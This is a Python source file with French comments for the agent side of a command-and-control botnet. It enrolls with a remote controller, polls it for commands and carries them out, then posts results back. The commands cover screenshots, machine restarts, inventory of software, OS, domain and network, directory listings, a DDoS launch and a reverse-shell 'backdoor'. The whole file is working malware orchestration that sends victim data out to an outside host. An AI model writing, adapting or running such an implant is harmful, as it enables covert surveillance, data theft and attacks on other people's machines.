# importations et variables
import requests, time, sys
try :
    import screenshot, power, scan, mapwindows, listread, multiReverseShell, ddos
finally :
    print('')

PORT = 12345
run = True

arguments = sys.argv[1:]
try:
	ControllerIP = arguments[0]
except:
	print("Entrez l'ip du contrôleur :") 
	ControllerIP = input("IP -> ")
try:
	ControllerPort = arguments[1]
except:
	print("Entrez le port du contrôleur :") 
	ControllerPort = input("Port -> ")
try:
	AgentName = arguments[2]
except:
	print("Entrez le nom du nouvel agent :")
	AgentName = input("Nom -> ")
ControllerUrl = "http://"+ControllerIP+":"+ControllerPort
# envoi de la requête
response = requests.get(ControllerUrl+"/enroll/"+AgentName)
if response.status_code == 200 :
	print("Connexion avec le contrôleur établie")
else :
	print("Echec de la connexion")
	run=False

def sendJson(instruction, data):
    url=ControllerUrl+"/data/"+AgentName+"/"+instruction
    requests.post(url, json=data)
    
def sendImage(instruction, imageFile):
    url=ControllerUrl+"/data/"+AgentName+"/"+instruction
    requests.post(url, files=imageFile)

# lancement du serveur
while run == True :
    response = requests.get(ControllerUrl+"/instruction/"+AgentName)
    if response.status_code != 200 or response.text == "quit":
        requests.post(ControllerUrl+"/quit/"+AgentName)
        run = False
        print("Connexion avec le contrôleur terminée")
    if response.text == "screenshot":
        print("taking screenshot")
        sendImage("screenshot", screenshot.capture())
    if response.text == "restart":
        print("restarting")
        power.restart()
    if response.text == "scanapps":
        print("scanning installed applications")
        sendJson("scanapps",scan.get_installed_applications())
    if response.text == "scanos":
        print("scanning os version")
        sendJson("scanos",scan.get_os_version())
    if response.text == "scandomain":
        print("scanning domain")
        sendJson("scandomain",scan.get_domain())
    if response.text == "scannet":
        print("scanning network")
        sendJson("scannet",mapwindows.scanNetwork())
    if response.text == "ls":
        print("reading directory .")
        sendJson("ls",listread.afficher_arborescence("."))
    if response.text == "ddos":
        print("launching ddos")
        ddos.ddos("localhost", 80)
    if response.text == "backdoor":
        print("opening backdoor")
        multiReverseShell.reverse_shell("localhost", 12345)
 
    time.sleep(2)
        
